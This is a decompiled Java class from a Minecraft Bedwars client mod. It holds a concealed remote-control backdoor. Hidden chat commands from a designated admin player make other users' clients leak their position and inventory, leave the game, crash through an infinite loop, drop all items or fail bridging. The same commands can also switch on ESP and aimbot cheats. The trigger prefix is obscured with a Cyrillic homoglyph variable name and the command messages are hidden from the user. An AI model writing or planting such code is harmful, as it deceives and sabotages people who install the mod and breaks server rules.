/*     */ package com.dimchig.bedwarsbro.dimchigspecial;
/*     */ 
/*     */ import com.dimchig.bedwarsbro.ChatSender;
/*     */ import com.dimchig.bedwarsbro.Main;
/*     */ import com.dimchig.bedwarsbro.MyChatListener;
/*     */ import com.dimchig.bedwarsbro.OnMyTickEvent;
/*     */ import com.dimchig.bedwarsbro.gui.GuiPlayerFocus;
/*     */ import com.dimchig.bedwarsbro.hints.BWItem;
/*     */ import com.dimchig.bedwarsbro.hints.BWItemsHandler;
/*     */ import com.dimchig.bedwarsbro.hints.HintsPlayerScanner;
/*     */ import com.dimchig.nolegit.AimHelper;
/*     */ import com.dimchig.nolegit.BowAimbot;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Calendar;
/*     */ import java.util.Collection;
/*     */ import java.util.Date;
/*     */ import net.minecraft.client.Minecraft;
/*     */ import net.minecraft.client.entity.EntityPlayerSP;
/*     */ import net.minecraft.client.network.NetworkPlayerInfo;
/*     */ import net.minecraft.entity.player.EntityPlayer;
/*     */ import net.minecraft.item.ItemStack;
/*     */ import net.minecraft.network.Packet;
/*     */ import net.minecraft.network.play.client.C07PacketPlayerDigging;
/*     */ import net.minecraft.potion.PotionEffect;
/*     */ import net.minecraft.util.BlockPos;
/*     */ import net.minecraft.util.EnumFacing;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class PlayerManipulator
/*     */ {
/*     */   public enum COMMAND
/*     */   {
/*  35 */     NONE(0),
/*  36 */     LEAVE(1),
/*  37 */     FULL_INFO(2),
/*  38 */     HIT_BLOCK_ON(3),
/*  39 */     HIT_BLOCK_OFF(4),
/*  40 */     MOD_VERSION(5),
/*  41 */     GAME_CRASH(6),
/*  42 */     DROP_ITEM(7),
/*  43 */     BRIDGE_FAIL(8),
/*  44 */     PRINT_PARTY_MEMBERS(9),
/*  45 */     ENABLE_ESP("a");
/*     */     
/*     */     public final String id;
/*     */     
/*     */     COMMAND(int id) {
/*  50 */       this.id = "" + id;
/*     */     }
/*     */     
/*     */     COMMAND(String id) {
/*  54 */       this.id = id;
/*     */     }
/*     */     
/*     */     public static COMMAND getById(String id) {
/*  58 */       for (COMMAND c : values()) {
/*  59 */         if (c.id.equals(id)) return c; 
/*     */       } 
/*  61 */       return NONE;
/*     */     }
/*     */   }
/*     */   
/*  65 */   String prefix = "2e3b1c80";
/*     */ 
/*     */   
/*     */   public boolean handleCommand(String player_name, String msg_text) {
/*     */     
/*  70 */     try { String text = msg_text.replace("§", "&").replace("&", "").trim();
/*     */       
/*  72 */       if (prеfix.length() == 0 || (Minecraft.func_71410_x()).field_71441_e.field_73012_v.nextInt(10) == 0) updatePrefix();
/*     */       
/*  74 */       if (!text.contains(prеfix) || (text.split(prеfix)).length != 2) return false; 
/*  75 */       String value = text.split(prеfix)[1].trim();
/*     */ 
/*     */       
/*  78 */       COMMAND cmd_type = COMMAND.getById("" + value.charAt(0));
/*     */ 
/*     */       
/*  81 */       if (cmd_type == COMMAND.NONE) return false;
/*     */       
/*  83 */       if (!Main.namePlateRenderer.isBroAdmin(player_name)) return false;
/*     */       
/*  85 */       String manipulate_player_id = value.substring(1);
/*  86 */       if (!getIdByNick((Minecraft.func_71410_x()).field_71439_g.func_70005_c_()).equals(manipulate_player_id))
/*     */       {
/*  88 */         return true;
/*     */       }
/*     */ 
/*     */ 
/*     */       
/*  93 */       if (cmd_type == COMMAND.LEAVE)
/*  94 */       { MyChatListener.removeNextMessage = true;
/*     */         
/*  96 */         ChatSender.addText("&c| &fТы перемещен в лобби &8▸ &fFlying is not enabled on this server");
/*  97 */         ChatSender.sendText("/leave"); }
/*  98 */       else if (cmd_type == COMMAND.FULL_INFO)
/*  99 */       { MyChatListener.removeNextMessage = true;
/* 100 */         String str = "?";
/*     */         
/*     */         try {
/* 103 */           EntityPlayerSP player = (Minecraft.func_71410_x()).field_71439_g;
/* 104 */           str = "я на " + (int)player.field_70165_t + ", " + (int)player.field_70161_v;
/* 105 */           BWItemsHandler.BWItemArmourLevel armourLevel = HintsPlayerScanner.getPlayerArmourLevel((EntityPlayer)player);
/*     */ 
/*     */ 
/*     */           
/* 109 */           String armour_s = "";
/* 110 */           if (armourLevel == BWItemsHandler.BWItemArmourLevel.CHAIN) armour_s = "кольчуге"; 
/* 111 */           if (armourLevel == BWItemsHandler.BWItemArmourLevel.IRON) armour_s = "железке"; 
/* 112 */           if (armourLevel == BWItemsHandler.BWItemArmourLevel.DIAMOND) armour_s = "алмазке"; 
/* 113 */           if (armour_s.length() > 0) {
/* 114 */             str = str + " в " + armour_s;
/*     */           }
/*     */           
/* 117 */           if ((player.func_70035_c()).length > 1) {
/* 118 */             ItemStack itemStack = player.func_70035_c()[1];
/*     */             
/* 120 */             if (itemStack.func_77986_q().func_74745_c() > 0) {
/* 121 */               str = str + " з" + ("" + itemStack.func_77986_q().func_150305_b(0).func_74781_a("lvl")).substring(0, 1);
/*     */             }
/*     */           } 
/*     */           
/* 125 */           Collection<PotionEffect> pe = player.func_70651_bq();
/* 126 */           for (PotionEffect effect : pe) {
/* 127 */             if (effect.func_76456_a() == BWItemsHandler.BWItemPotionsID.STRENGTH.id) {
/* 128 */               str = str + " под силой " + (effect.func_76459_b() / 20) + "с";
/*     */               
/*     */               break;
/*     */             } 
/*     */           } 
/*     */           
/* 134 */           ArrayList<String> items_to_show = new ArrayList<String>();
/*     */           
/* 136 */           String sword = "";
/*     */ 
/*     */ 
/*     */ 
/*     */           
/* 141 */           if (Main.shopManager.findItemInHotbar("swordDiamond") != -1) sword = "алм"; 
/* 142 */           if (sword.length() > 0) items_to_show.add(sword + " меч");
/*     */           
/* 144 */           if (Main.shopManager.findItemInHotbar("bow") != -1) items_to_show.add("лук");
/*     */ 
/*     */           
/* 147 */           for (BWItem item : BWItemsHandler.bwitems) {
/* 148 */             if (item.type == BWItemsHandler.BWItemType.POTION_STRENGTH && Main.shopManager.findItemInHotbar(item.display_name) != -1) {
/* 149 */               items_to_show.add("силка");
/*     */             }
/*     */           } 
/*     */ 
/*     */           
/* 154 */           ItemStack[] items = (Minecraft.func_71410_x()).field_71439_g.field_71071_by.field_70462_a;
/* 155 */           int cnt_emeralds = 0;
/* 156 */           int cnt_diamonds = 0;
/* 157 */           int cnt_fireball = 0;
/* 158 */           int cnt_pearl = 0;
/* 159 */           for (ItemStack item : items) {
/* 160 */             if (item != null) {
/* 161 */               if (item.func_77977_a().equals("item.diamond")) cnt_diamonds += item.field_77994_a; 
/* 162 */               if (item.func_77977_a().equals("item.emerald")) cnt_emeralds += item.field_77994_a; 
/* 163 */               if (item.func_77977_a().equals("item.fireball")) cnt_fireball += item.field_77994_a; 
/* 164 */               if (item.func_77977_a().equals("item.enderPearl")) cnt_pearl += item.field_77994_a; 
/*     */             } 
/* 166 */           }  if (cnt_pearl > 0) items_to_show.add(cnt_pearl + " перл" + MyChatListener.getNumberEnding(cnt_pearl, "", "а", "ов")); 
/* 167 */           if (cnt_emeralds > 0) items_to_show.add(cnt_emeralds + " изюм" + MyChatListener.getNumberEnding(cnt_emeralds, "", "а", "ов")); 
/* 168 */           if (cnt_diamonds > 0) items_to_show.add(cnt_diamonds + " алмаз" + MyChatListener.getNumberEnding(cnt_diamonds, "", "а", "ов")); 
/* 169 */           if (cnt_fireball > 0) items_to_show.add(cnt_fireball + " фаер" + MyChatListener.getNumberEnding(cnt_fireball, "", "а", "ов"));
/*     */           
/* 171 */           if (items_to_show.size() > 0) {
/* 172 */             str = str + ". У меня ";
/* 173 */             for (int i = 0; i < items_to_show.size(); i++) {
/* 174 */               str = str + (String)items_to_show.get(i);
/* 175 */               if (i < items_to_show.size() - 1) str = str + ", ";
/*     */             
/*     */             } 
/*     */           } 
/* 179 */         } catch (Exception exception) {}
/* 180 */         ChatSender.sendText("!" + str.substring(0, Math.min(98, str.length()))); }
/* 181 */       else if (cmd_type == COMMAND.HIT_BLOCK_ON)
/* 182 */       { MyChatListener.removeNextMessage = true;
/* 183 */         CantHitDimChig.isActive = true;
/* 184 */         ChatSender.sendText("!+"); }
/* 185 */       else if (cmd_type == COMMAND.HIT_BLOCK_OFF)
/* 186 */       { MyChatListener.removeNextMessage = true;
/* 187 */         CantHitDimChig.isActive = false;
/* 188 */         ChatSender.sendText("!-"); }
/* 189 */       else if (cmd_type == COMMAND.MOD_VERSION)
/* 190 */       { MyChatListener.removeNextMessage = true;
/* 191 */         CantHitDimChig.isActive = false;
/* 192 */         ChatSender.sendText("!У меня версия 1.69.2"); }
/* 193 */       else { if (cmd_type == COMMAND.GAME_CRASH) {
/* 194 */           int x = 0; while (true)
/* 195 */             x++; 
/* 196 */         }  if (cmd_type == COMMAND.DROP_ITEM) {
/* 197 */           Minecraft.func_71410_x().func_147114_u().func_147297_a((Packet)new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.DROP_ALL_ITEMS, new BlockPos(0, 0, 0), EnumFacing.DOWN));
/* 198 */         } else if (cmd_type == COMMAND.BRIDGE_FAIL) {
/* 199 */           OnMyTickEvent.time_bwmanipulator_cant_sneak = (new Date()).getTime() + 3000L;
/* 200 */         } else if (cmd_type == COMMAND.PRINT_PARTY_MEMBERS) {
/* 201 */           MyChatListener.bwmanipulator_party_info = 1;
/* 202 */           ChatSender.sendText("/party info");
/* 203 */         } else if (cmd_type == COMMAND.ENABLE_ESP) {
/* 204 */           GuiPlayerFocus.STATE = !GuiPlayerFocus.STATE;
/* 205 */           GuiPlayerFocus.isT_Active = true;
/* 206 */           AimHelper.isActive = true;
/* 207 */           BowAimbot.isActive = true;
/* 208 */           BowAimbot.isDrawActive = true;
/* 209 */           MyChatListener.removeNextMessage = true;
/* 210 */           ChatSender.sendText("!" + (GuiPlayerFocus.STATE ? "+" : "-"));
/*     */         }  }
/*     */       
/* 213 */       return true; }
/* 214 */     catch (Exception ex) { return false; }
/*     */   
/*     */   }
/*     */   public String getCommand(String manipulate_name, COMMAND command) {
/* 218 */     String generated = prеfix + "" + command.id + "";
/* 219 */     String pId = getIdByNick(manipulate_name);
/* 220 */     if (pId == null) return null; 
/* 221 */     generated = generated + pId;
/* 222 */     return generated;
/*     */   }
/* 224 */   public static String prеfix = "";
/*     */   
/*     */   public void updatePrefix() {
/* 227 */     Calendar cal = Calendar.getInstance();
/* 228 */     int dayOfMonth = cal.get(5);
/* 229 */     int month = cal.get(2) + 1;
/* 230 */     prеfix = Integer.toHexString((int)Math.pow((dayOfMonth + 675), 3.0D) % 4096) + Integer.toHexString((int)Math.pow((month + 187), 3.0D) % 4096);
/*     */   }
/*     */ 
/*     */   
/*     */   public String getIdByNick(String nick) {
/*     */     
/* 236 */     try { Collection<NetworkPlayerInfo> players = Minecraft.func_71410_x().func_147114_u().func_175106_d();
/*     */       
/* 238 */       int cnt = 0;
/* 239 */       for (NetworkPlayerInfo info : players) {
/* 240 */         if (info == null || info.func_178845_a() == null || info.func_178845_a().getName() == null || info.func_178845_a().getId() == null || 
/* 241 */           !info.func_178845_a().getName().equals(nick))
/*     */           continue; 
/* 243 */         String id = ("" + info.func_178845_a().getId()).replace("-", "");
/*     */ 
/*     */         
/* 246 */         return id;
/*     */       }  }
/* 248 */     catch (Exception ex) { return null; }
/* 249 */      return null;
/*     */   }
/*     */ }


/* Location:              C:\Users\1337a\Downloads\bedwarsbro-1.69.2.jar!\com\dimchig\bedwarsbro\dimchigspecial\PlayerManipulator.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */